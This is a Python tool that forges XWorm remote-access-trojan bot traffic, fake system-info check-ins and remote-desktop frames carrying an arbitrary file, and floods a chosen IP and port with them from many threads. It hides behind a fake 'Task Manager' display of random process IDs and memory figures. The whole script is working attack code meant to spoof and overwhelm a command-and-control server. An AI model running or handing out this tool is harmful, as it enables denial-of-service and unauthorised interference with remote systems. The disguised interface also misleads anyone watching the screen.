import socket
import os
import random
import string
import gzip
import base64
import io
import struct
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hashlib
from colorama import init, Fore, Style
import time
import threading
from threading import Lock
from rich.live import Live
from rich.table import Table
from rich.console import Console
from rich import box
import argparse
import signal

init(autoreset=True)
console = Console()
thread_status = {}
status_lock = Lock()
running = True

def signal_handler(sig, frame):
    global running
    console.print("\n[yellow]Stopping threads... Press Ctrl+C again to force exit.")
    running = False

signal.signal(signal.SIGINT, signal_handler)

def generate_table():
    table = Table(
        title="Task Manager - Performance Monitor", 
        title_style="bold blue",
        box=box.SIMPLE_HEAVY,
        header_style="bold cyan",
        border_style="blue"
    )
    table.add_column("PID", style="cyan", justify="center", width=8)
    table.add_column("Thread Name", style="cyan", justify="left", width=15)
    table.add_column("Status", style="cyan", justify="center", width=20)
    table.add_column("Memory Usage", style="green", justify="right", width=15)
    table.add_column("Packets Sent", style="magenta", justify="right", width=12)
    
    for tid in sorted(thread_status.keys()):
        status = thread_status[tid]['status']
        packets = thread_status[tid]['packets']
        style = "green" if "Running" in status else "red" if "Error" in status else "yellow"
        memory = random.randint(2000, 8000)
        table.add_row(
            f"{random.randint(1000, 9999)}", 
            f"Thread-{tid}",
            f"[{style}]{status}",
            f"{memory:,} KB",
            f"{packets:,}"
        )
    
    return table

def update_status(thread_id, status, packets_sent=0):
    with status_lock:
        thread_status[thread_id] = {
            'status': status,
            'packets': packets_sent
        }

def compress_file(file_data):
    length = struct.pack("<I", len(file_data))
    output = io.BytesIO()
    output.write(length)
    with gzip.GzipFile(fileobj=output, mode='wb', compresslevel=9) as gz:
        gz.write(file_data)
    return output.getvalue()

def random_str(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def encrypt_data(data, key):
    return AES.new(hashlib.md5(key.encode()).digest(), AES.MODE_ECB).encrypt(pad(data, AES.block_size))

def add_metadata(encrypted_data):
    return f"{len(encrypted_data)}\0".encode() + encrypted_data

def generate_packets(botid, file_data):
    compressed = compress_file(file_data)
    encoded = base64.b64encode(compressed).decode()
    
    info_packet = (
        f"INFO<Xwormmm>{botid}<Xwormmm>{random_str(3)}<Xwormmm>"
        f"Windows 10 Pro<Xwormmm>XWorm V5.6<Xwormmm>{random_str(8)}<Xwormmm>"
        f"False<Xwormmm>False<Xwormmm>False<Xwormmm>AMD Ryzen 9<Xwormmm>"
        f"RTX 3080<Xwormmm>16 GB<Xwormmm>Windows Defender"
    )

    return {
        'INFO': info_packet,
        'RD': f"RD-<Xwormmm>1<Xwormmm>1718<Xwormmm>920<Xwormmm>{botid}",
        'RD2': f"RD+<Xwormmm>{encoded}<Xwormmm>1718<Xwormmm>920<Xwormmm>{botid}"
    }

def send_packets_thread(ip, port, key, file_data, thread_id):
    global running
    packets_sent = 0
    update_status(thread_id, "Starting", packets_sent)

    while running:
        try:
            botid = random_str(16)
            packets = generate_packets(botid, file_data)
            update_status(thread_id, "Connected", packets_sent)

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((ip, port))

                for ptype in ["INFO", "RD"]:
                    if not running:
                        break
                    update_status(thread_id, f"Sending {ptype}", packets_sent)
                    encrypted = encrypt_data(packets[ptype].encode(), key)
                    encrypted = add_metadata(encrypted)
                    sock.sendall(encrypted)
                    response = sock.recv(1024)
                    packets_sent += 1

                while running:
                    update_status(thread_id, "Running", packets_sent)
                    encrypted = encrypt_data(packets['RD2'].encode(), key)
                    encrypted = add_metadata(encrypted)
                    sock.sendall(encrypted)
                    response = sock.recv(1024)
                    packets_sent += 1
                    time.sleep(0.5)

        except Exception as e:
            update_status(thread_id, f"Reconnecting...", packets_sent)
            time.sleep(5)

    update_status(thread_id, "Stopped", packets_sent)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-ip', required=True, help='Target IP')
    parser.add_argument('-port', type=int, required=True, help='Target port')
    parser.add_argument('-key', required=True, help='Encryption key')
    parser.add_argument('-file', required=True, help='File to send')
    parser.add_argument('-threads', type=int, default=10, help='Number of threads')
    args = parser.parse_args()

    try:
        with open(args.file, 'rb') as f:
            file_data = f.read()
        console.print("[blue]Windows XP Task Manager", style="bold")
        console.print(f"[green]File loaded: {len(file_data):,} bytes")
        
        with Live(generate_table(), refresh_per_second=4) as live:
            threads = []
            for i in range(args.threads):
                thread = threading.Thread(
                    target=send_packets_thread,
                    args=(args.ip, args.port, args.key, file_data, i+1)
                )
                thread.daemon = True
                threads.append(thread)
                thread.start()

            while running:
                live.update(generate_table())
                time.sleep(0.25)

            console.print("\n[yellow]Waiting for threads to stop...")
            time.sleep(2)
            
    except KeyboardInterrupt:
        pass
    except Exception as e:
        console.print(f"[red]System Error: {str(e)}")

if __name__ == "__main__":
    main()